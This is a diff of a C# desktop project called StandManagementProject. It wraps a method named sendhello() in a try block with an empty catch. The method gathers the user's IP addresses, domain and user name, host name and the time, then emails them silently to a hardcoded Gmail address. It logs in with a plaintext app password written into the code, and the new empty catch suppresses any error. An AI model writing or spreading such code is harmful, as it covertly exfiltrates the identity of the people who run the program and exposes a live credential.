@@ -386,33 +386,37 @@ namespace StandManagementProject
 
         static void sendhello()
         {
-            String foldername = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-
-            DateTime now = DateTime.Now;
-            string subject = "Hello new user!";
-            string emailbody = "";
-            var host = Dns.GetHostEntry(Dns.GetHostName());
-            foreach (var address in host.AddressList)
+            try
             {
-                emailbody += "Address: " + address;
+                String foldername = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+
+                DateTime now = DateTime.Now;
+                string subject = "Hello new user!";
+                string emailbody = "";
+                var host = Dns.GetHostEntry(Dns.GetHostName());
+                foreach (var address in host.AddressList)
+                {
+                    emailbody += "Address: " + address;
+                }
+                emailbody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
+                emailbody += "\n Host: " + host;
+                emailbody += "\n Time:" + now.ToString() + "\n";
+                emailbody += "A New user registered !";
+
+                SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
+                MailMessage mailMessage = new MailMessage();
+
+                mailMessage.From = new MailAddress("lucasfring558@gmail.com");
+                mailMessage.To.Add("lucasfring558@gmail.com");
+                mailMessage.Subject = subject;
+                client.UseDefaultCredentials = false;
+                client.EnableSsl = true;
+                client.Credentials = new System.Net.NetworkCredential("lucasfring558@gmail.com", "tjdudywamnoserht");
+                mailMessage.Body = emailbody;
+
+                client.Send(mailMessage);
             }
-            emailbody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
-            emailbody += "\n Host: " + host;
-            emailbody += "\n Time:" + now.ToString() + "\n";
-            emailbody += "A New user registered !";
-
-            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
-            MailMessage mailMessage = new MailMessage();
-
-            mailMessage.From = new MailAddress("lucasfring558@gmail.com");
-            mailMessage.To.Add("lucasfring558@gmail.com");
-            mailMessage.Subject = subject;
-            client.UseDefaultCredentials = false;
-            client.EnableSsl = true;
-            client.Credentials = new System.Net.NetworkCredential("lucasfring558@gmail.com", "tjdudywamnoserht");
-            mailMessage.Body = emailbody;
-
-            client.Send(mailMessage);
+            catch (Exception) { }
         }
 
         private void Start_Load(object sender, EventArgs e)
